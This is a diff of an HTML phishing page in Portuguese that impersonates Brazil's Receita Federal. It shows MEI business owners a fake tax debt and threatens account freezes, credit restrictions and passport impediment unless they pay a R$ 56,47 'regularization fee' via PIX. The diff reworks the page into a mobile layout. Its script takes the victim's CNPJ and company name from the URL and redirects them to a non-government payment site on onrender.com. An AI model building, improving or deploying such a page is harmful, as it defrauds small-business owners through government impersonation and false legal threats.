@@ -2,440 +2,382 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Portal de Regularização Cadastral - Secretaria da Receita Federal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>Regularização MEI - Oficial</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Montserrat:wght@700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --gov-blue: #003366;
-            --gov-blue-dark: #002244;
-            --gov-gold: #b8860b;
-            --danger: #c62828;
-            --danger-bg: #fff5f5;
-            --success: #1b5e20;
-            --bg-gray: #f2f5f7;
+            --danger: #df2020;
+            --success: #27ae60;
+            --bg: #f8fafc;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
             --white: #ffffff;
-            --text-dark: #1a1a1a;
-            --text-light: #555555;
-            --border: #d1d9e0;
-            --shadow-sm: 0 2px 4px rgba(0,0,0,0.05);
-            --shadow-md: 0 10px 25px rgba(0,0,0,0.08);
+            --radius: 16px;
+            --safe-area-inset-bottom: env(safe-area-inset-bottom);
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: var(--bg-gray);
-            color: var(--text-dark);
             font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text-main);
             line-height: 1.5;
+            padding-bottom: calc(100px + var(--safe-area-inset-bottom));
         }
 
-        /* Banner de Urgência Institucional */
-        .top-alert {
-            background-color: var(--danger);
-            color: white;
-            text-align: center;
-            padding: 12px 20px;
-            font-weight: 700;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
-        }
-
-        .wrapper {
-            max-width: 600px;
-            margin: 0 auto;
-            padding-bottom: 50px;
-        }
-
-        /* Cabeçalho Premium */
+        /* Header Mobile Otimizado */
         header {
             background: var(--white);
-            padding: 30px 20px;
-            text-align: center;
-            border-bottom: 1px solid var(--border);
-            position: relative;
-        }
-
-        header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, var(--gov-blue) 0%, #0056b3 100%);
-        }
-
-        .logo-container {
-            margin-bottom: 15px;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #e2e8f0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .brasao {
-            height: 65px;
+            height: 40px;
             width: auto;
         }
 
-        .gov-brand h1 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.1rem;
+        .header-text h1 {
+            font-size: 0.9rem;
             font-weight: 800;
             color: var(--gov-blue);
             text-transform: uppercase;
-            letter-spacing: -0.5px;
+            line-height: 1.1;
         }
 
-        .gov-brand p {
-            font-size: 0.75rem;
-            color: var(--text-light);
+        .header-text p {
+            font-size: 0.65rem;
+            color: var(--text-muted);
             font-weight: 600;
+        }
+
+        /* Banner de Alerta Compacto */
+        .alert-bar {
+            background: var(--danger);
+            color: white;
+            padding: 8px 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-align: center;
             text-transform: uppercase;
         }
 
-        /* Conteúdo Principal */
-        .content {
+        main {
             padding: 20px;
         }
 
-        /* Card de Notificação */
-        .notice-card {
+        /* Card de Informações Estilo App */
+        .info-card {
             background: var(--white);
-            border-radius: 8px;
-            box-shadow: var(--shadow-md);
-            border: 1px solid var(--border);
-            overflow: hidden;
-            margin-bottom: 25px;
+            border-radius: var(--radius);
+            padding: 20px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+            margin-bottom: 20px;
+            border: 1px solid #f1f5f9;
         }
 
-        .notice-header {
-            background: #f8f9fa;
-            padding: 18px 20px;
-            border-bottom: 1px solid var(--border);
+        .card-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .badge-live {
+            color: var(--danger);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .badge-live::before {
+            content: "";
+            width: 6px;
+            height: 6px;
+            background: var(--danger);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        .data-group {
+            margin-bottom: 16px;
+        }
+
+        .data-group:last-child { margin-bottom: 0; }
+
+        .data-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .data-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--gov-blue);
+            word-break: break-all;
+        }
+
+        .status-box {
+            background: #fff1f2;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+            border-left: 4px solid var(--danger);
+        }
+
+        .status-text {
+            color: var(--danger);
+            font-weight: 800;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+        }
+
+        /* Seção de Consequências (Accordion-like) */
+        .warning-section {
+            margin-bottom: 24px;
+        }
+
+        .warning-title {
+            font-size: 0.9rem;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .warning-item {
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #334155;
+            font-weight: 600;
+        }
+
+        .warning-icon {
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        /* Footer Fixo de Ação (Bottom Sheet Style) */
+        .bottom-action {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: var(--white);
+            padding: 16px 20px calc(16px + var(--safe-area-inset-bottom));
+            box-shadow: 0 -10px 25px rgba(0,0,0,0.1);
+            border-top: 1px solid #e2e8f0;
+            z-index: 200;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .price-info {
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .notice-header h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 0.95rem;
-            font-weight: 800;
-            color: var(--danger);
-            text-transform: uppercase;
-        }
-
-        .status-badge {
-            background: var(--gov-blue);
-            color: white;
-            font-size: 0.65rem;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-weight: 800;
-            text-transform: uppercase;
-        }
-
-        .notice-body {
-            padding: 20px;
-        }
-
-        .info-row {
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .info-row:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-        }
-
-        .info-label {
-            display: block;
-            font-size: 0.7rem;
-            color: #888;
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-bottom: 4px;
-        }
-
-        .info-value {
-            display: block;
-            font-size: 0.95rem;
-            font-weight: 700;
-            color: var(--gov-blue-dark);
-            word-break: break-all;
-        }
-
-        .status-critical {
-            color: var(--danger);
-            font-weight: 800;
-        }
-
-        /* Texto de Aviso */
-        .warning-text {
-            font-size: 0.9rem;
-            color: var(--text-dark);
-            text-align: center;
-            margin: 25px 0;
-            padding: 0 15px;
-            font-weight: 500;
-        }
-
-        /* Seção de Consequências */
-        .legal-consequences {
-            background: var(--danger-bg);
-            border: 1px solid #ffcdd2;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-
-        .legal-consequences h3 {
-            font-size: 0.85rem;
-            color: var(--danger);
-            font-weight: 800;
-            text-transform: uppercase;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-
-        .legal-consequences h3::before {
-            content: "⚠️";
-            margin-right: 10px;
-        }
-
-        .list-item {
+        .price-text {
             font-size: 0.8rem;
+            color: var(--text-muted);
             font-weight: 600;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: flex-start;
-            color: #555;
         }
 
-        .list-item::before {
-            content: "→";
-            color: var(--danger);
-            margin-right: 10px;
-            font-weight: 900;
-        }
-
-        .bold-danger {
-            color: var(--danger);
-            font-weight: 700;
-        }
-
-        /* Seção de Pagamento */
-        .cta-box {
-            background: var(--gov-blue);
-            border-radius: 12px;
-            padding: 35px 25px;
-            text-align: center;
-            color: white;
-            box-shadow: 0 15px 35px rgba(0, 51, 102, 0.25);
-            position: relative;
-        }
-
-        .verification-seal {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 0.55rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            background: rgba(255,255,255,0.15);
-            padding: 4px 8px;
-            border: 1px solid rgba(255,255,255,0.3);
-            border-radius: 4px;
-        }
-
-        .cta-label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            opacity: 0.9;
-            margin-bottom: 10px;
-        }
-
-        .cta-amount {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 3.2rem;
-            font-weight: 900;
-            margin-bottom: 25px;
-            display: block;
-        }
-
-        .btn-submit {
-            display: block;
-            background: #27ae60;
-            color: white;
-            text-decoration: none;
-            padding: 20px;
-            border-radius: 8px;
-            font-size: 1.1rem;
+        .price-val {
+            font-size: 1.5rem;
             font-weight: 800;
+            color: var(--gov-blue);
+        }
+
+        .btn-pay {
+            background: var(--success);
+            color: white;
+            text-align: center;
+            padding: 16px;
+            border-radius: 14px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 1.05rem;
             text-transform: uppercase;
-            transition: all 0.2s;
-            box-shadow: 0 5px 0 #1e8449;
-            margin-bottom: 15px;
+            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
+            transition: transform 0.1s;
         }
 
-        .btn-submit:active {
-            transform: translateY(3px);
-            box-shadow: 0 2px 0 #1e8449;
+        .btn-pay:active {
+            transform: scale(0.98);
         }
 
-        .pix-badge {
+        .pix-tag {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-align: center;
+            font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            font-size: 0.85rem;
-            font-weight: 700;
+            gap: 4px;
         }
 
-        .pix-icon {
-            height: 18px;
-            filter: brightness(0) invert(1);
+        .pix-tag img {
+            height: 12px;
+            filter: grayscale(1);
+            opacity: 0.7;
         }
 
-        /* Rodapé */
-        .footer-disclaimer {
-            margin-top: 30px;
-            padding: 20px;
-            background: #e9ecef;
-            border-radius: 8px;
+        /* Disclaimer Final */
+        .legal-disclaimer {
             font-size: 0.7rem;
-            color: #666;
+            color: var(--text-muted);
             text-align: justify;
-            border: 1px solid #dee2e6;
+            background: #f1f5f9;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 20px;
         }
 
-        .footer-disclaimer strong {
+        .legal-disclaimer strong {
             color: var(--danger);
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
         }
 
-        .final-footer {
+        .footer-bottom {
             text-align: center;
-            padding: 40px 20px;
-            color: #999;
+            padding: 20px 0;
             font-size: 0.65rem;
+            color: var(--text-muted);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
-        @media (max-width: 480px) {
-            .cta-amount { font-size: 2.8rem; }
-            .btn-submit { font-size: 1rem; padding: 18px; }
-            .wrapper { width: 100%; }
-        }
     </style>
 </head>
 <body>
 
-    <div class="top-alert">
-        Atenção: Prazo de Regularização Administrativa em Fase Final
+    <header>
+        <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Gov" class="brasao">
+        <div class="header-text">
+            <h1>Receita Federal</h1>
+            <p>Portal de Regularização MEI</p>
+        </div>
+    </header>
+
+    <div class="alert-bar">
+        ⚠️ Ação Urgente Requerida: Prazo Final
     </div>
 
-    <div class="wrapper">
-        <header>
-            <div class="logo-container">
-                <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão da República" class="brasao">
+    <main>
+        <div class="info-card">
+            <div class="card-label">
+                <span>Dados do Contribuinte</span>
+                <span class="badge-live">Em Processamento</span>
             </div>
-            <div class="gov-brand">
-                <h1>Ministério da Fazenda</h1>
-                <p>Secretaria Especial da Receita Federal do Brasil</p>
-            </div>
-        </header>
-
-        <main class="content">
-            <div class="notice-card">
-                <div class="notice-header">
-                    <h2>Notificação Eletrônica</h2>
-                    <span class="status-badge">Oficial</span>
-                </div>
-                <div class="notice-body">
-                    <div class="info-row">
-                        <span class="info-label">CNPJ do Contribuinte</span>
-                        <span id="cnpj-display" class="info-value">Processando...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Razão Social / Nome</span>
-                        <span id="empresa-display" class="info-value">Processando...</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Situação Cadastral</span>
-                        <span class="info-value status-critical">DÉBITO EM FASE DE EXECUÇÃO FISCAL</span>
-                    </div>
-                </div>
+            
+            <div class="data-group">
+                <span class="data-label">CNPJ</span>
+                <span id="cnpj" class="data-value">...</span>
             </div>
 
-            <p class="warning-text">
-                Detectamos pendências críticas na abertura do seu CNPJ MEI. A não regularização imediata implica em sanções diretas ao seu CPF.
-            </p>
-
-            <div class="legal-consequences">
-                <h3>Implicações Legais Imediatas</h3>
-                <div class="list-item">Vencimento antecipado de dívidas e inscrição em <span class="bold-danger">Dívida Ativa</span>.</div>
-                <div class="list-item">Bloqueio judicial de ativos financeiros via <span class="bold-danger">SISBAJUD</span>.</div>
-                <div class="list-item">Restrição creditícia imediata nos órgãos <span class="bold-danger">SERASA e SPC</span>.</div>
-                <div class="list-item">Impedimento de emissão de <span class="bold-danger">Certidões Negativas</span>.</div>
+            <div class="data-group">
+                <span class="data-label">Razão Social</span>
+                <span id="empresa" class="data-value">...</span>
             </div>
 
-            <div class="cta-box">
-                <div class="verification-seal">Documento Autenticado</div>
-                <p class="cta-label">Taxa de Regularização e Baixa:</p>
-                <span class="cta-amount">R$ 56,47</span>
-                <a href="#" id="main-action-btn" class="btn-submit">
-                    Regularizar Situação Agora
-                </a>
-                <div class="pix-badge">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix" class="pix-icon">
-                    Compensação Instantânea via PIX
-                </div>
+            <div class="status-box">
+                <span class="status-text">⚠️ Débito em Fase de Execução</span>
             </div>
+        </div>
 
-            <div class="footer-disclaimer">
-                <strong>NOTIFICAÇÃO FINAL:</strong>
-                Este comunicado constitui a última tentativa de resolução administrativa. A regularização por este canal suspende automaticamente o envio do processo à Procuradoria-Geral da Fazenda Nacional (PGFN) e evita a penhora online de contas vinculadas ao CPF do titular.
+        <div class="warning-section">
+            <h2 class="warning-title">Consequências Imediatas</h2>
+            
+            <div class="warning-item">
+                <span class="warning-icon">📉</span>
+                <span>Restrição Total no CPF (Serasa/SPC)</span>
             </div>
-        </main>
+            <div class="warning-item">
+                <span class="warning-icon">🚫</span>
+                <span>Bloqueio de Contas (SISBAJUD)</span>
+            </div>
+            <div class="warning-item">
+                <span class="warning-icon">⚖️</span>
+                <span>Inscrição em Dívida Ativa da União</span>
+            </div>
+            <div class="warning-item">
+                <span class="warning-icon">🛂</span>
+                <span>Impedimento de Passaporte e Crédito</span>
+            </div>
+        </div>
 
-        <footer class="final-footer">
-            &copy; 2026 Receita Federal do Brasil<br>
-            Brasília - Distrito Federal
-        </footer>
+        <div class="legal-disclaimer">
+            <strong>AVISO DE ULTIMATO:</strong>
+            A regularização por este canal suspende imediatamente o envio do processo para a PGFN e evita a penhora online de bens e valores vinculados ao CPF do titular.
+        </div>
+
+        <div class="footer-bottom">
+            &copy; 2026 Receita Federal do Brasil
+        </div>
+    </main>
+
+    <div class="bottom-action">
+        <div class="price-info">
+            <span class="price-text">Taxa Única de Regularização:</span>
+            <span class="price-val">R$ 56,47</span>
+        </div>
+        <a href="#" id="btn-main" class="btn-pay">
+            Regularizar Agora
+        </a>
+        <div class="pix-tag">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix">
+            Liberação imediata via PIX
+        </div>
     </div>
 
     <script>
-        /**
-         * Limpa strings removendo colchetes, aspas e espaços extras
-         */
-        function cleanData(str) {
+        function clean(str) {
             if (!str) return "";
-            // Remove colchetes [ ], aspas " ' e espaços nas extremidades
-            return str.replace(/[\[\]"' ]/g, "").trim() || str;
+            return str.replace(/[\[\]"']/g, "").trim();
         }
 
-        /**
-         * Versão melhorada para extrair parâmetros da URL
-         */
-        function getParams() {
+        function getUrlParams() {
             const params = {};
             const search = window.location.search;
             if (search) {
@@ -443,9 +385,7 @@
                 for (const part of parts) {
                     const [key, value] = part.split("=");
                     if (key) {
-                        let decodedValue = decodeURIComponent(value || "");
-                        // Aplica a limpeza para remover colchetes e outros caracteres
-                        params[decodeURIComponent(key)] = decodedValue.replace(/[\[\]"']/g, "").trim();
+                        params[decodeURIComponent(key)] = clean(decodeURIComponent(value || ""));
                     }
                 }
             }
@@ -453,25 +393,19 @@
         }
 
         window.onload = function() {
-            const data = getParams();
-            
-            // Fallbacks caso não existam parâmetros
+            const data = getUrlParams();
             const cnpj = data['cnpj'] || "Não identificado";
             const empresa = data['empresa'] || "Contribuinte não identificado";
-            
-            // Atualiza a interface
-            document.getElementById('cnpj-display').textContent = cnpj;
-            document.getElementById('empresa-display').textContent = empresa;
-            
-            // Configura o botão de ação
-            const btn = document.getElementById('main-action-btn');
-            const targetBase = "https://nacionalmei.onrender.com/PEND/";
-            
+
+            document.getElementById('cnpj').textContent = cnpj;
+            document.getElementById('empresa').textContent = empresa;
+
+            const btn = document.getElementById('btn-main');
+            const baseUrl = "https://nacionalmei.onrender.com/PEND/";
+
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                // Redireciona com os dados limpos
-                const finalUrl = `${targetBase}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
-                window.location.href = finalUrl;
+                window.location.href = `${baseUrl}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
             });
         };
     </script>
